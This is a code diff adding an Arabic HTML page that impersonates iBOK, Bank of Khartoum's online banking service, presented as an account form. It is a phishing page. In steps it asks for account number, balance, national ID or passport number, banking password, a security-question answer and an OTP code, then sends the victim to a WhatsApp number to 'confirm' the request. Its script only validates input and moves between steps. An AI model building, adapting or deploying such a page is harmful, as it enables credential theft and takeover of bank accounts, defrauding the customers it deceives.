@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iBOK - الاستمارة أونلاين</title>
+  <style>
+    :root {
+      --primary-red: #d32f2f;
+      --header-red: #c62828;
+      --yellow-btn: #fbc02d;
+      --bg-gray: #f5f5f5;
+      --border-color: #d1d5db;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-gray);
+      color: #333;
+      padding-bottom: 20px;
+    }
+
+    /* Header Section */
+    .header {
+      background: linear-gradient(to right, #b71c1c, #e53935);
+      color: white;
+      padding: 15px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+
+    .header .logo-area {
+      text-align: right;
+    }
+
+    .header h1 {
+      font-size: 28px;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+
+    .header p {
+      font-size: 14px;
+    }
+
+    .header .btn-ibok {
+      background-color: var(--yellow-btn);
+      color: #000;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 13px;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    /* Container */
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 15px;
+    }
+
+    /* Info Note */
+    .info-note {
+      background-color: #fff;
+      border-right: 4px solid var(--primary-red);
+      padding: 10px;
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 15px;
+      border-radius: 4px;
+    }
+
+    /* Section Titles */
+    .section-title {
+      background-color: var(--primary-red);
+      color: white;
+      padding: 8px 12px;
+      font-size: 14px;
+      font-weight: bold;
+      border-radius: 6px;
+      margin-top: 15px;
+      margin-bottom: 12px;
+    }
+
+    /* Input Rows */
+    .form-group {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    .form-group label {
+      font-size: 13px;
+      font-weight: bold;
+      width: 45%;
+      text-align: right;
+    }
+
+    .form-group input, .form-group select {
+      width: 52%;
+      padding: 8px 10px;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      background-color: #fafafa;
+      font-size: 13px;
+      transition: border-color 0.3s ease;
+    }
+
+    /* Boxes Grid Inputs */
+    .boxes-container {
+      display: flex;
+      gap: 3px;
+      width: 52%;
+      direction: ltr;
+    }
+
+    .boxes-container input {
+      width: 100%;
+      height: 32px;
+      text-align: center;
+      padding: 0;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      background-color: #fff;
+      transition: border-color 0.3s ease;
+    }
+
+    .date-separator {
+      display: flex;
+      align-items: center;
+      padding: 0 2px;
+      font-weight: bold;
+    }
+
+    /* Validation Error Highlighting */
+    .input-error {
+      border: 1.5px solid #d32f2f !important;
+      background-color: #ffebee !important;
+    }
+
+    /* Option Cards */
+    .option-card {
+      background-color: #fff;
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      padding: 10px 15px;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+    }
+
+    .option-card span {
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .option-card input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+    }
+
+    /* Terms Box */
+    .terms-box {
+      background-color: #fff;
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 15px 0;
+      transition: border-color 0.3s ease;
+    }
+
+    .terms-box label {
+      font-size: 12px;
+      color: #444;
+    }
+
+    /* Buttons */
+    .submit-btn {
+      width: 100%;
+      background: linear-gradient(to right, #e53935, #d32f2f);
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(211, 47, 47, 0.3);
+      margin-top: 10px;
+      text-decoration: none;
+      display: inline-block;
+      text-align: center;
+    }
+
+    .whatsapp-btn {
+      background: linear-gradient(to right, #25D366, #128C7E);
+      box-shadow: 0 4px 6px rgba(37, 211, 102, 0.3);
+    }
+
+    .submit-btn:disabled {
+      background: #ccc;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    /* Card Box Styles */
+    .custom-box {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      border: 1px solid var(--border-color);
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      margin-top: 10px;
+    }
+
+    .custom-box .form-group {
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 15px;
+    }
+
+    .custom-box .form-group label {
+      width: 100%;
+      margin-bottom: 6px;
+    }
+
+    .custom-box .form-group input, 
+    .custom-box .form-group select {
+      width: 100%;
+      padding: 10px;
+    }
+
+    /* Timer Styles */
+    .timer-container {
+      text-align: center;
+      margin: 15px 0;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .timer-badge {
+      display: inline-block;
+      background-color: #ffebee;
+      color: var(--primary-red);
+      font-weight: bold;
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 16px;
+      margin-top: 5px;
+      border: 1px solid #ffcdd2;
+    }
+
+    .resend-btn {
+      background: none;
+      border: none;
+      color: var(--primary-red);
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 13px;
+      font-weight: bold;
+      margin-top: 8px;
+    }
+
+    /* Success Card */
+    .success-card {
+      text-align: center;
+      padding: 30px 20px;
+    }
+
+    .success-icon {
+      width: 60px;
+      height: 60px;
+      background-color: #4caf50;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      margin: 0 auto 15px auto;
+    }
+
+    .whatsapp-icon-bg {
+      background-color: #25D366;
+    }
+
+    .success-title {
+      font-size: 20px;
+      color: #2e7d32;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    /* Hidden Utility */
+    .hidden {
+      display: none;
+    }
+
+    /* Footer Navigation */
+    .footer-nav {
+      display: flex;
+      justify-content: space-around;
+      margin-top: 25px;
+      background-color: #fff;
+      padding: 12px 0;
+      border-top: 1px solid #eee;
+    }
+
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 11px;
+      color: #666;
+      text-decoration: none;
+    }
+
+    .icon-circle {
+      width: 35px;
+      height: 35px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      margin-bottom: 4px;
+      font-weight: bold;
+    }
+
+    .bg-blue { background-color: #3b5998; }
+    .bg-lime { background-color: #8bc34a; }
+    .bg-red { background-color: #e53935; }
+    .bg-green { background-color: #009688; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="header">
+    <button class="btn-ibok">iBOK الخدمة المصرفية</button>
+    <div class="logo-area">
+      <h1>iBOK</h1>
+      <p id="header-subtitle">الاستمارة أونلاين</p>
+    </div>
+  </header>
+
+  <div class="container">
+
+    <!-- PAGE 1: Registration Form -->
+    <div id="page1">
+      <div class="info-note">
+        يرجى ملء هذا النموذج بدقة ووضع البيانات الصحيحة حسب الاقتضاء.
+      </div>
+
+      <div class="section-title">بيانات الحساب الأساسية</div>
+
+      <div class="form-group">
+        <label>رقم الحساب / Account No:</label>
+        <div class="boxes-container auto-tab-container" id="account-no-container">
+          <input type="text" maxlength="1">
+          <input type="text" maxlength="1">
+          <input type="text" maxlength="1">
+          <input type="text" maxlength="1">
+          <input type="text" maxlength="1">
+          <input type="text" maxlength="1">
+          <input type="text" maxlength="1">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>الرصيد المتبقي / Balance:</label>
+        <input type="text" id="balance" placeholder="0.00" dir="ltr" style="text-align: right;">
+      </div>
+
+      <div class="form-group">
+        <label>الفرع / Branch:</label>
+        <input type="text" id="branch" placeholder="أدخل اسم الفرع">
+      </div>
+
+      <div class="form-group">
+        <label>التاريخ / Date (2000/1/30):</label>
+        <div class="boxes-container auto-tab-container" id="date-container">
+          <input type="text" maxlength="2">
+          <span class="date-separator">/</span>
+          <input type="text" maxlength="2">
+          <span class="date-separator">/</span>
+          <input type="text" maxlength="4">
+        </div>
+      </div>
+
+      <div class="section-title">نوع الحساب / Account Type</div>
+
+      <div id="account-types-group">
+        <div class="option-card"><span>توفير</span><input type="checkbox" class="account-type-cb"></div>
+        <div class="option-card"><span>توفير مميز</span><input type="checkbox" class="account-type-cb"></div>
+        <div class="option-card"><span>توفير طلاب</span><input type="checkbox" class="account-type-cb"></div>
+        <div class="option-card"><span>حساب جاري</span><input type="checkbox" class="account-type-cb"></div>
+        <div class="option-card"><span>حساب شركة</span><input type="checkbox" class="account-type-cb"></div>
+        <div class="option-card"><span>حساب استثماري</span><input type="checkbox" class="account-type-cb"></div>
+        <div class="option-card"><span>حساب ادخاري</span><input type="checkbox" class="account-type-cb"></div>
+      </div>
+
+      <div class="section-title">بيانات العميل الشخصية</div>
+
+      <div class="form-group">
+        <label>الاسم بالعربي رباعي / Arabic Name:</label>
+        <input type="text" id="arabic-name" placeholder="الاسم رباعي بالعربي">
+      </div>
+
+      <div class="form-group">
+        <label>الاسم بالإنجليزي رباعي / English Name:</label>
+        <input type="text" id="english-name" placeholder="Full Quad Name">
+      </div>
+
+      <div class="form-group">
+        <label>رقم الهاتف / Mobile No:</label>
+        <input type="text" id="mobile-no" placeholder="09xxxxxxxx">
+      </div>
+
+      <div class="section-title">تفاصيل إثبات الشخصية</div>
+
+      <div class="form-group">
+        <label>نوع الهوية / ID Type:</label>
+        <select id="id-type">
+          <option value="رقم وطني">رقم وطني</option>
+          <option value="جواز سفر">جواز سفر</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>رقم الهوية / ID No:</label>
+        <div class="boxes-container auto-tab-container" id="id-no-container">
+          <input type="text" maxlength="1"><input type="text" maxlength="1">
+          <input type="text" maxlength="1"><input type="text" maxlength="1">
+          <input type="text" maxlength="1"><input type="text" maxlength="1">
+          <input type="text" maxlength="1"><input type="text" maxlength="1">
+          <input type="text" maxlength="1"><input type="text" maxlength="1">
+          <input type="text" maxlength="1">
+        </div>
+      </div>
+
+      <div class="terms-box" id="terms-container">
+        <label for="terms">أقر أنا العميل بصحة البيانات المذكورة أعلاه وأوافق على الشروط.</label>
+        <input type="checkbox" id="terms">
+      </div>
+
+      <button class="submit-btn" onclick="goToPage2()">تقديم الاستمارة</button>
+    </div>
+
+    <!-- PAGE 2: Login Page -->
+    <div id="page2" class="hidden">
+      <div class="info-note">
+        تم إرسال الاستمارة بنجاح. يرجى تسجيل الدخول إلى حسابك لمتابعة الطلب.
+      </div>
+
+      <div class="section-title">تسجيل الدخول / Login</div>
+
+      <div class="custom-box">
+        <div class="form-group">
+          <label>رقم الحساب / Account Number:</label>
+          <input type="text" id="login-acc" placeholder="أدخل رقم الحساب">
+        </div>
+
+        <div class="form-group">
+          <label>كلمة المرور / Password:</label>
+          <input type="password" id="login-pass" placeholder="أدخل كلمة المرور (حروف + أرقام + رموز)">
+        </div>
+
+        <button class="submit-btn" onclick="goToPage3()">تسجيل الدخول</button>
+      </div>
+    </div>
+
+    <!-- PAGE 3: Phone Verification -->
+    <div id="page3" class="hidden">
+      <div class="info-note">
+        يرجى تأكيد رقم الهاتف المسجل لدى البنك لتلقي رمز التحقق.
+      </div>
+
+      <div class="section-title">تأكيد رقم الهاتف / Phone Verification</div>
+
+      <div class="custom-box">
+        <div class="form-group">
+          <label>رقم الهاتف المرتبط بالحساب / Mobile Number:</label>
+          <input type="text" id="verify-phone" placeholder="09xxxxxxxx">
+        </div>
+
+        <button class="submit-btn" onclick="goToPage4()">متابعة</button>
+      </div>
+    </div>
+
+    <!-- PAGE 4: Security Questions -->
+    <div id="page4" class="hidden">
+      <div class="info-note">
+        يرجى اختيار سؤال الأمان وإدخال الإجابة الصحيحة للتحقق من هوية صاحب الحساب.
+      </div>
+
+      <div class="section-title">سؤال الأمان / Security Question</div>
+
+      <div class="custom-box">
+        <div class="form-group">
+          <label>اختر سؤال الأمان / Select Question:</label>
+          <select id="sec-question">
+            <option value="" disabled selected>-- اختر السؤال --</option>
+            <option>ما هو فيلمك المفضل</option>
+            <option>ما هو افضل صديق لديك</option>
+            <option>ما اسم المدرسة الذي تحقق بها</option>
+            <option>في اي مدينه ولدت</option>
+            <option>ماذا كان لقبك اثناء الطفولة</option>
+            <option>ما اسم اول بلد اجنبي قمت بزيارته</option>
+            <option>ما هو اسم سيارتك المفضله</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>الإجابة / Answer:</label>
+          <input type="text" id="sec-answer" placeholder="أدخل إجابة سؤال الأمان هنا...">
+        </div>
+
+        <button class="submit-btn" onclick="goToPage5()">تأكيد ومتابعة</button>
+      </div>
+    </div>
+
+    <!-- PAGE 5: OTP Verification -->
+    <div id="page5" class="hidden">
+      <div class="info-note">
+        تم إرسال رمز التحقق (OTP) إلى رقم الهاتف / البريد الإلكتروني الخاص بك.
+      </div>
+
+      <div class="section-title">رمز التحقق / OTP Code</div>
+
+      <div class="custom-box">
+        <div class="form-group">
+          <label>أدخل رمز OTP / Enter OTP Code:</label>
+          <input type="text" id="otp-input" placeholder="أدخل الرمز هنا" maxlength="6" style="text-align: center; letter-spacing: 4px; font-size: 18px;">
+        </div>
+
+        <div class="timer-container">
+          <p>تنتهي صلاحية الرمز خلال:</p>
+          <div class="timer-badge" id="timer">59:00</div>
+          <br>
+          <button class="resend-btn hidden" id="resend-btn" onclick="startTimer()">إعادة إرسال الرمز</button>
+        </div>
+
+        <button class="submit-btn" onclick="finishProcess()">تأكيد وإرسال النهائي</button>
+      </div>
+    </div>
+
+    <!-- PAGE 6: Final Success Page -->
+    <div id="page6" class="hidden">
+      <div class="custom-box success-card">
+        <div class="success-icon">✓</div>
+        <div class="success-title">تم رفع الاستمارة بنجاح</div>
+        <p style="font-size: 13px; color: #666; margin-top: 10px; margin-bottom: 20px;">
+          شكراً لك، تم استلام طلبك وبانتظار معالجته من قبل الفريق المختص.
+        </p>
+        <button class="submit-btn" onclick="goToPage7()">متابعة حالة الطلب</button>
+      </div>
+    </div>
+
+    <!-- PAGE 7: WhatsApp Contact Page -->
+    <div id="page7" class="hidden">
+      <div class="custom-box success-card">
+        <div class="success-icon whatsapp-icon-bg">💬</div>
+        <div class="success-title" style="color: #128C7E;">تم إرسال الاستمارة بنجاح</div>
+        <p style="font-size: 14px; color: #444; margin: 15px 0; line-height: 1.6;">
+          يرجى التواصل مع خدمة العملاء عبر رقم الواتساب لتأكيد طلبك وإكمال الإجراءات:
+          <br>
+          <strong style="font-size: 18px; color: #d32f2f; display: block; margin-top: 8px;" dir="ltr">0969938717</strong>
+        </p>
+        <a href="https://wa.me/249969938717" target="_blank" class="submit-btn whatsapp-btn">
+          التواصل عبر الواتساب
+        </a>
+      </div>
+    </div>
+
+    <!-- Footer Navigation -->
+    <footer class="footer-nav">
+      <a href="#" class="nav-item">
+        <div class="icon-circle bg-blue">f</div>
+        <span>فيس بوك</span>
+      </a>
+      <a href="#" class="nav-item">
+        <div class="icon-circle bg-lime">📞</div>
+        <span>المساعدة</span>
+      </a>
+      <a href="#" class="nav-item">
+        <div class="icon-circle bg-red">📍</div>
+        <span>مواقعنا</span>
+      </a>
+      <a href="#" class="nav-item">
+        <div class="icon-circle bg-green">🌐</div>
+        <span>بنك الخرطوم</span>
+      </a>
+    </footer>
+
+  </div>
+
+  <script>
+    let timerInterval;
+
+    // تنسيق دخل المبلغ بالفواصل تلقائياً أثناء الكتابة مثل بنكك
+    const balanceInput = document.getElementById('balance');
+    balanceInput.addEventListener('input', function (e) {
+      let value = this.value.replace(/[^0-9]/g, '');
+      if (value) {
+        this.value = parseInt(value, 10).toLocaleString('en-US');
+      } else {
+        this.value = '';
+      }
+    });
+
+    // Auto-Tab Script & إزالة التحديد عند الكتابة
+    document.querySelectorAll('input, select').forEach(element => {
+      element.addEventListener('input', () => element.classList.remove('input-error'));
+      element.addEventListener('change', () => element.classList.remove('input-error'));
+    });
+
+    document.querySelectorAll('.auto-tab-container').forEach(container => {
+      const inputs = Array.from(container.querySelectorAll('input'));
+
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', () => {
+          const maxLength = parseInt(input.getAttribute('maxlength')) || 1;
+          if (input.value.length >= maxLength) {
+            if (index < inputs.length - 1) {
+              inputs[index + 1].focus();
+            }
+          }
+        });
+
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && input.value.length === 0) {
+            if (index > 0) {
+              inputs[index - 1].focus();
+            }
+          }
+        });
+      });
+    });
+
+    // التحكم في اختيار نوع حساب واحد فقط
+    const accountTypeCBs = document.querySelectorAll('.account-type-cb');
+    accountTypeCBs.forEach(cb => {
+      cb.addEventListener('click', function(e) {
+        if (this.checked) {
+          accountTypeCBs.forEach(otherCb => {
+            if (otherCb !== this && otherCb.checked) {
+              e.preventDefault();
+              this.checked = false;
+              alert('يرجى إلغاء تحديد المربع الأول أولاً لاختيار نوع حساب آخر.');
+            }
+          });
+        }
+      });
+    });
+
+    // دالة فحص وتحديد الحقول المربعة الفارغة
+    function checkAndHighlightBoxes(containerId) {
+      const inputs = document.querySelectorAll(`#${containerId} input`);
+      let allFilled = true;
+      let firstEmpty = null;
+
+      inputs.forEach(input => {
+        if (input.value.trim() === '') {
+          input.classList.add('input-error');
+          allFilled = false;
+          if (!firstEmpty) firstEmpty = input;
+        } else {
+          input.classList.remove('input-error');
+        }
+      });
+
+      if (firstEmpty) firstEmpty.focus();
+      return allFilled;
+    }
+
+    // دالة فحص وتحديد المدخلات العادية
+    function validateField(elementId) {
+      const el = document.getElementById(elementId);
+      if (!el.value.trim()) {
+        el.classList.add('input-error');
+        el.focus();
+        return false;
+      }
+      el.classList.remove('input-error');
+      return true;
+    }
+
+    function goToPage2() {
+      let isValid = true;
+
+      // 1. الشروط والأحكام
+      const termsBox = document.getElementById('terms-container');
+      const termsCb = document.getElementById('terms');
+      if (!termsCb.checked) {
+        termsBox.classList.add('input-error');
+        termsBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        isValid = false;
+      } else {
+        termsBox.classList.remove('input-error');
+      }
+
+      // 2. رقم الهوية
+      if (!checkAndHighlightBoxes('id-no-container')) isValid = false;
+
+      // 3. البيانات الشخصية
+      if (!validateField('mobile-no')) isValid = false;
+      if (!validateField('english-name')) isValid = false;
+      if (!validateField('arabic-name')) isValid = false;
+
+      // 4. نوع الحساب
+      const accountTypes = document.querySelectorAll('.account-type-cb');
+      let accountTypeSelected = Array.from(accountTypes).some(cb => cb.checked);
+      if (!accountTypeSelected) {
+        alert('يرجى اختيار نوع الحساب.');
+        isValid = false;
+      }
+
+      // 5. التاريخ والفرع والرصيد
+      if (!checkAndHighlightBoxes('date-container')) isValid = false;
+      if (!validateField('branch')) isValid = false;
+      if (!validateField('balance')) isValid = false;
+
+      // 6. رقم الحساب
+      if (!checkAndHighlightBoxes('account-no-container')) isValid = false;
+
+      if (!isValid) {
+        alert('يرجى تعبئة الخانات المحددة باللون الأحمر.');
+        return;
+      }
+
+      document.getElementById('page1').classList.add('hidden');
+      document.getElementById('page2').classList.remove('hidden');
+      document.getElementById('header-subtitle').innerText = "تسجيل الدخول";
+      window.scrollTo(0, 0);
+    }
+
+    // التعديل الرئيسي في دالة الانتقال للصفحة الثالثة
+    function goToPage3() {
+      let isValid = true;
+      const passEl = document.getElementById('login-pass');
+      const passVal = passEl.value;
+
+      if (!validateField('login-acc')) isValid = false;
+      if (!validateField('login-pass')) isValid = false;
+
+      if (!isValid) {
+        alert('يرجى إدخال البيانات المحددة بالأحمر.');
+        return;
+      }
+
+      // التحقق من وجود أرقام ورموز وحروف في كلمة المرور
+      const hasLetter = /[a-zA-Z\u0600-\u06FF]/.test(passVal);
+      const hasNumber = /[0-9]/.test(passVal);
+      const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(passVal);
+
+      if (!hasLetter || !hasNumber || !hasSpecialChar) {
+        passEl.classList.add('input-error');
+        passEl.focus();
+        alert('كلمة المرور يجب أن تحتوي على حروف وأرقام ورموز خاصة (مثل: Almezmose123@#)');
+        return;
+      }
+
+      document.getElementById('page2').classList.add('hidden');
+      document.getElementById('page3').classList.remove('hidden');
+      document.getElementById('header-subtitle').innerText = "تأكيد الهاتف";
+      window.scrollTo(0, 0);
+    }
+
+    function goToPage4() {
+      if (!validateField('verify-phone')) {
+        alert('يرجى إدخال رقم الهاتف.');
+        return;
+      }
+
+      document.getElementById('page3').classList.add('hidden');
+      document.getElementById('page4').classList.remove('hidden');
+      document.getElementById('header-subtitle').innerText = "أسئلة الأمان";
+      window.scrollTo(0, 0);
+    }
+
+    function goToPage5() {
+      let isValid = true;
+      if (!validateField('sec-answer')) isValid = false;
+      if (!validateField('sec-question')) isValid = false;
+
+      if (!isValid) {
+        alert('يرجى اختيار سؤال الأمان وإجابتة.');
+        return;
+      }
+
+      document.getElementById('page4').classList.add('hidden');
+      document.getElementById('page5').classList.remove('hidden');
+      document.getElementById('header-subtitle').innerText = "رمز التحقق OTP";
+      window.scrollTo(0, 0);
+      startTimer();
+    }
+
+    function startTimer() {
+      clearInterval(timerInterval);
+      let totalSeconds = 59 * 60; 
+      const timerElement = document.getElementById('timer');
+      const resendBtn = document.getElementById('resend-btn');
+
+      resendBtn.classList.add('hidden');
+
+      timerInterval = setInterval(() => {
+        totalSeconds--;
+        
+        let minutes = Math.floor(totalSeconds / 60);
+        let seconds = totalSeconds % 60;
+
+        let formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
+        let formattedSeconds = seconds < 10 ? "0" + seconds : seconds;
+
+        timerElement.innerText = formattedMinutes + ":" + formattedSeconds;
+
+        if (totalSeconds <= 0) {
+          clearInterval(timerInterval);
+          timerElement.innerText = "انتهت المهلة";
+          resendBtn.classList.remove('hidden');
+        }
+      }, 1000);
+    }
+
+    function finishProcess() {
+      if (!validateField('otp-input')) {
+        alert("يرجى إدخال رمز التحقق (OTP).");
+        return;
+      }
+      clearInterval(timerInterval);
+      document.getElementById('page5').classList.add('hidden');
+      document.getElementById('page6').classList.remove('hidden');
+      document.getElementById('header-subtitle').innerText = "إتمام العملية";
+      window.scrollTo(0, 0);
+    }
+
+    function goToPage7() {
+      document.getElementById('page6').classList.add('hidden');
+      document.getElementById('page7').classList.remove('hidden');
+      document.getElementById('header-subtitle').innerText = "التواصل مع الدعم";
+      window.scrollTo(0, 0);
+    }
+  </script>
+
+</body>
+</html>
